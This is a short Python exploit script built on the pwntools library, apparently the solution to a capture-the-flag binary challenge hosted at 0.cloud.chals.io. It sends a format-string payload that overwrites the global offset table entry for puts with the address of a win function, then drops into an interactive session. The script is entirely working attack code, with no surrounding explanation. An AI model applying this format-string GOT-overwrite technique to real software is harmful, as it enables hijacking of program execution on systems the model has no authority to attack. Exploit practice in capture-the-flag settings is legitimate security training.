from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

if args.REMOTE:
   HOST = '0.cloud.chals.io' 
   PORT=11163
else:
   pass

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process(e.path)


p = start()


payload_writes = {
         e.got['puts'] : e.sym['win']
}

payload = fmtstr_payload(6,payload_writes)

chain = b'0xdeadbeef\0'

p.sendline(chain)

p.sendline(payload)

p.interactive()
